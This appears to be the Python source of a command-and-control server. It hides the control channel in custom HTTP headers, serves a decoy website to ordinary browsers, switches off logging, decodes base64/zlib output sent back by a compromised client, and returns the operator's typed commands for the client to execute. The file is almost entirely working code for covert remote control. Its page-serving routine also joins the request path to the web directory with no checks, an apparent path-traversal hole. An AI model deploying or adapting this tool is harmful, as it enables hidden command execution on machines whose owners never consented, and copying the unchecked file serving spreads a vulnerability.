'''
Executes on the C2 server. Runs an HTTP server that listens for requests from the client.

Assumes only one client connects.
'''

# from urllib import request, parse
from http.server import SimpleHTTPRequestHandler, HTTPServer
import base64
import zlib
import threading
from queue import Queue
import time
from utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME

WEB_DIRECTORY = 'web' # Root directory of website files.

# The inputs entered by the user, to be sent to the client to be executed (the `queue` library is thread-safe)
user_inputs = Queue()
# The current message being formed via requests from the client
current_message = Queue()

def decode_data(encoded_data):
    # Retrieve the encoded data from the HTTP header
    if encoded_data:
        # Decode the data
        compressed_bytes = base64.b64decode(encoded_data) # Skip first char
        # Decompress the data
        return zlib.decompress(compressed_bytes).decode('utf-8')
    else:
        return ""

class RequestHandler(SimpleHTTPRequestHandler):
    '''
    Instantiated on each HTTP request to handle the request.
    '''
    def __init__(self, *args, **kwargs):
        # Set directory to be the web directory
        super().__init__(*args, directory=WEB_DIRECTORY, **kwargs)
    
    def log_message(self, format, *args):
        pass # Do nothing (silences logs)

    def is_stego_request(self):
        '''
        Check if this request is steganographic communication from the client
        or just a normal request from a browser.
        '''
        # Check if stego header is present.
        return self.headers.get(STEGO_HEADER_NAME)
    
    def is_last_request(self):
        '''
        Check if this steganographic request is the last one in message, or if more requests are incoming.
        '''
        return self.headers.get(STEGO_HEADER_NAME).startswith("1")

    def get_encoded_data(self):
        ''''
        Get encoded data from request, excluding the starting character.
        '''
        return self.headers.get(STEGO_HEADER_NAME)[1:]

    def serve_normal_web_content(self):
        '''
        Serves 'normal' HTML pages from the website, not used for steganographic communication.
        '''
        if self.path == '/':
            self.path = '/index.html'
        self.path = self.directory + self.path
        try:
            with open(self.path, "r") as f:
                file_content = f.read()
            self.send_response(200)
        except:
            file_content = 'File not found.'
            self.send_response(404)
        self.end_headers()
        self.wfile.write(bytes(file_content, 'utf-8'))

    def do_GET(self):
        # Check if request is steganographic communication or just regular browser traffic.
        if not self.is_stego_request():
            self.serve_normal_web_content()
            return
        global current_message
        current_message.put(self.get_encoded_data())
        self.send_response(200)
        self.end_headers()
        if not self.is_last_request():
            # Send a normal response (doesn't contain steganographic reply yet)
            return
        output = ""
        while not current_message.empty():
            output += current_message.get()
        output = decode_data(output)
        current_message = Queue() # Reset queue
        # Display command output from client machine
        print("\n" + output + "\n")
        global user_inputs
        # Wait for user input now.
        while (user_inputs.empty()):
            time.sleep(1)
        # Send a steganographic response containing command input
        # Write command input to HTML file contents (TODO: use image steganography instead)
        self.wfile.write(user_inputs.get().encode())


def run_http_server():
    server_address = (LISTENER_IP, LISTENER_PORT)
    httpd = HTTPServer(server_address, RequestHandler)
    httpd.serve_forever()

def main():
    # Run the http server in a background thread.
    server_thread = threading.Thread(target=run_http_server)
    server_thread.daemon = True # Ensures thread ends on main program exit.
    server_thread.start()
    while(True):
        global user_inputs
        user_inputs.put(input())

if __name__ == '__main__':
    main()